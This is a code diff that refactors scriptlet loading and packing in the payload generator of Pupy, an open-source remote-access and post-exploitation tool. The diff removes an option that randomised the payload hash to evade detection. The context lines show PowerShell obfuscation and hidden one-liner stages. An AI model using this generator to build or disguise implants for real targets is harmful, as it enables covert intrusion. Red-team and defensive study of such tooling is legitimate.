@@ -13,7 +13,6 @@ import tarfile
 import tempfile
 import shutil
 import subprocess
-import pkgutil
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
@@ -21,7 +20,6 @@ if __name__ == '__main__':
     sys.path.insert(0, os.path.join(ROOT, 'pupy', 'library_patches'))
 
 import marshal
-import scriptlets
 import cPickle
 import base64
 import os
@@ -42,7 +40,9 @@ from pupylib.PupyLogger import getLogger
 from pupylib.PupyOutput import Success, Warn, Error, List, Table, MultiPart, Color
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
-from scriptlets.scriptlets import ScriptletArgumentError
+from scriptlets import (
+    load_scriptlets, ScriptletsPacker, ScriptletArgumentError
+)
 from modules.lib.windows.powershell import obfuscatePowershellScript
 from pupylib.PupyCredentials import Credentials, EncryptionError
 
@@ -175,7 +175,7 @@ def get_raw_conf(display, conf, obfuscate=False, verbose=False):
             (10, 5, 10), (50, 30, 50), (-1, 150, 300)]))),
         'pupy.cid = CONFIGURATION_CID',
         'debug={}'.format(bool(conf.get('debug', False))),
-        offline_script
+        'SCRIPTLETS={}'.format(repr(offline_script) if offline_script else '')
     ])
 
     return compress_encode_obfs(config) if obfuscate else config
@@ -437,20 +437,8 @@ def generate_binary_from_template(display, config, osname, arch=None, shared=Fal
 
     return generator(display, template, config, compressed, debug), filename, makex
 
-def load_scriptlets():
-    scl = {}
-    for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
-        if not is_pkg:
-            continue
-
-        scriptlet = loader.find_module(module_name).load_module(module_name)
-        scl[module_name] = scriptlet
-
-    return scl
-
-def parse_scriptlets(display, args_scriptlet, os=None, arch=None, debug=False):
-    scriptlets_dic = load_scriptlets()
-    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch)
+def pack_scriptlets(display, scriptlets, args_scriptlet, os=None, arch=None, debug=False):
+    sp = ScriptletsPacker(os, arch)
 
     for sc in args_scriptlet:
         tab = sc.split(",", 1)
@@ -463,21 +451,26 @@ def parse_scriptlets(display, args_scriptlet, os=None, arch=None, debug=False):
             except:
                 raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
 
-        if name not in scriptlets_dic:
+        if name not in scriptlets:
             raise ValueError("unknown scriptlet %s, valid choices are : %s"%(
                 repr(name), [
-                    x for x in scriptlets_dic.iterkeys()
+                    x for x in scriptlets.iterkeys()
                 ]))
 
-        display(Success('loading scriptlet {} with args {}'.format(repr(name), sc_args)))
+        display(Success('loading scriptlet {}{}'.format(
+            repr(name),
+            'with args {}'.format(
+                ' '.join(
+                    '{}={}'.format(k, repr(v)) for k,v in sc_args.iteritems())
+            ) if sc_args else '')))
 
         try:
-            sp.add_scriptlet(scriptlets_dic[name], sc_args)
+            sp.add_scriptlet(scriptlets[name], sc_args)
 
         except ScriptletArgumentError as e:
             display(MultiPart(
                 Error('Scriptlet {} argument error: {}'.format(repr(name), str(e))),
-                scriptlets_dic[name].format_help()))
+                scriptlets[name].format_help()))
             raise ValueError('{}'.format(e))
 
     script_code = sp.pack()
@@ -522,7 +515,6 @@ def get_parser(base_parser, config):
     parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                             action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
-    parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
     parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner locally (default: %(default)s)")
     parser.add_argument('--oneliner-no-ssl', default=False, action='store_true', help="No ssl for ps1_oneliner stages (default: %(default)s)")
     parser.add_argument('--oneliner-nothidden', default=False, action='store_true', help="Powershell script not hidden target side (default: %(default)s)")
@@ -541,8 +533,9 @@ def get_parser(base_parser, config):
     return parser
 
 def pupygen(args, config, display):
+    scriptlets = load_scriptlets(args.os, args.arch)
+
     if args.list:
-        scriptlets_dic = load_scriptlets()
         display(MultiPart([
             Table([{
                 'FORMAT': f, 'DESCRIPTION': d
@@ -560,10 +553,14 @@ def pupygen(args, config, display):
             ['TRANSPORT', 'DESCRIPTION'], Color('Available transports (usage: -t <transport>)', 'yellow')),
 
             Table([{
-                'SCRIPTLET': name, 'DESCRIPTION': sc.__doc__
-            } for name, sc in scriptlets_dic.iteritems()],
-            ['SCRIPTLET', 'DESCRIPTION'], Color(
-                'Available scriptlets (usage: -s <scriptlet>[,arg1=value1,arg2=value2]', 'yellow'))
+                'SCRIPTLET': name, 'DESCRIPTION': sc.description, 'ARGS': '; '.join(
+                    '{}={}'.format(k,v) for k,v in sc.arguments.iteritems()
+                )
+            } for name, sc in scriptlets.iteritems()],
+            ['SCRIPTLET', 'DESCRIPTION', 'ARGS'], Color(
+                'Available scriptlets for {}/{} '
+                '(usage: -s <scriptlet>[,arg1=value1,arg2=value2]'.format(
+                    args.os or 'any', args.arch or 'any'), 'yellow'))
         ]))
 
         raise NoOutput()
@@ -572,13 +569,20 @@ def pupygen(args, config, display):
         os.chdir(args.workdir)
 
     script_code=""
-    if args.scriptlet:
-        script_code = parse_scriptlets(
-            display,
-            args.scriptlet,
-            os=args.os,
-            arch=args.arch,
-            debug=args.debug_scriptlets)
+
+    try:
+        if args.scriptlet:
+            script_code = pack_scriptlets(
+                display,
+                scriptlets,
+                args.scriptlet,
+                os=args.os,
+                arch=args.arch,
+                debug=args.debug_scriptlets)
+
+    except ValueError, e:
+        display(Error(e.message))
+        raise NoOutput()
 
     launcher = launchers[args.launcher]()
     while True:
@@ -621,9 +625,6 @@ def pupygen(args, config, display):
                 return
         else:
             break
-
-    if args.randomize_hash:
-        script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
 
     conf = {
         'launcher': args.launcher,
